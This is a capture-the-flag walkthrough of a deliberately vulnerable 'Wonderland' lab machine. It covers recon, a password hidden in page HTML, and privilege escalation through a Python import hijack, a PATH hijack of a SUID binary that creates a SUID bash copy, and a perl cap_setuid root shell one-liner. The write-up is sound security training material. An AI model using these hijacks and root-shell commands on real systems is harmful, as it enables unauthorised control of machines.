# Wonderland

Notes on the ctf.

## recon

### nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8eeefb96cead70dd05a93b0db071b863 (RSA)
|   256 7a927944164f204350a9a847e2c2be84 (ECDSA)
|_  256 000b8044e63d4b6947922c55147e2ac9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
MAC Address: 02:8D:C4:16:E5:AF (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/25%OT=22%CT=1%CU=37712%PV=Y%DS=1%DC=D%G=Y%M=028DC4%T
OS:M=64C01672%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms ip-10-10-93-0.eu-west-1.compute.internal (10.10.93.0)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.20 seconds
```

### gobuster

`└─# gobuster dir -u 10.10.93.0 -w /usr/share/wordlists/dirb/big.txt `

```
/img                  (Status: 301) [Size: 0] [--> img/]
/poem                 (Status: 301) [Size: 0] [--> poem/]
/r                    (Status: 301) [Size: 0] [--> r/]
```

`└─# gobuster dir -u 10.10.93.0/r -w /usr/share/wordlists/dirb/big.txt`

```
/a                    (Status: 301) [Size: 0] [--> a/]
```

### website

I guess the pattern here: http://10.10.93.0/r/a/b/b/i/t/

`    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>` looks like a hidden username:password...

`alice:HowDothTheLittleCrocodileImproveHisShiningTail` is the login for ssh.

### steganography


`└─# steghide info white_rabbit_1.jpg `

```
  embedded file "hint.txt":
```

https://github.com/RickdeJager/stegseek

`follow the r a b b i t`, looks like nothing new.


### initial access

`└─# ssh alice@10.10.93.0`

`alice@wonderland:~$`

`alice@wonderland:/home$ cat /root/user.txt`


**thm{"Curiouser and curiouser!"}**

## escalation

`Sudo version 1.8.21p2`

`Linux wonderland 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux`


`alice@wonderland:~$ sudo -l`

```
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
Perhaps we need to gain access to the user `rabbit`.


### linpeas

```
Vulnerable to CVE-2021-4034
```

```
Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

https://gtfobins.github.io/gtfobins/perl/

Keep this in the back of your mind...



### walrus_and_the_carpenter.py to get rabbit

can only be run with sudo by rabbit.

```
import random
poem = """
	lots of lines here...
"""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

Poem is by Lewis Carroll

https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8

'The searched module will be located in one of the defined paths, but if Python finds a module with the same name in a folder with higher priority, it will import that module instead of the “legit” one'


`alice@wonderland:~$ locate random`

```
/usr/lib/python3.6/random.py
```

`alice@wonderland:~$ vim random.py`

```
import os
os.system("/bin/bash")
```

`alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`



### teaParty to get hatter

go to rabbit's home directory.

```
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty*
```

`rabbit@wonderland:/home/rabbit$ ulimit -c unlimited`

`rabbit@wonderland:/home/rabbit$ ltrace ./teaParty `

```
setuid(1003)                                                                                                = -1
setgid(1003)                                                                                                = -1
puts("Welcome to the tea party!\nThe Ma"...Welcome to the tea party!
The Mad Hatter will be here soon.
)                                                                = 60
system("/bin/echo -n 'Probably by ' && d"...Probably by Wed, 26 Jul 2023 01:15:26 +0000
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                      = 0
puts("Ask very nicely, and I will give"...Ask very nicely, and I will give you some tea while you wait for him
)                                                                 = 69
getchar(1, 0x564f165f0260, 0x7f575cf708c0, 0x7f575cc93154
)                                                  = 10
puts("Segmentation fault (core dumped)"...Segmentation fault (core dumped)
)                                                                 = 33
+++ exited (status 33) +++
```

Run a few times

```
Probably by Wed, 26 Jul 2023 01:30:35 +0000
```

```
Probably by Wed, 26 Jul 2023 01:30:44 +0000
```

`rabbit@wonderland:/home/rabbit$ date`

```
Wed Jul 26 00:32:19 UTC 2023
```

`rabbit@wonderland:/home/rabbit$ cat teaParty`

The relevant line:
```
The Mad Hatter will be here soon./bin/echo -n 'Probably by ' && date --date='next hour' -RAsk very nicely, and I will give you some tea while you wait for himSegmentation fault (core dumped)8,�������������T����������<���,zRx
```

`rabbit@wonderland:/home/rabbit$ echo $PATH`

`rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH`

`rabbit@wonderland:/home/rabbit$ vim /tmp/date`

```
#!/bin/sh
echo $(id)
```

Run teaParty again

```
Probably by uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```


```
#!/bin/bash

cp /bin/bash /tmp/yay && chmod u+s /tmp/yay
echo "Yay"
```

run teaParty, and the run `rabbit@wonderland:/home/rabbit$ /tmp/yay -p` which opens a shell with the effective user ID of hatter.



Find `WhyIsARavenLikeAWritingDesk?`

`yay-4.4$ su hatter` with this password.

### perl to root

recall `/usr/bin/perl = cap_setuid+ep`


Modifying the command from https://gtfobins.github.io/gtfobins/perl/

`hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

```
#
```


**thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}**
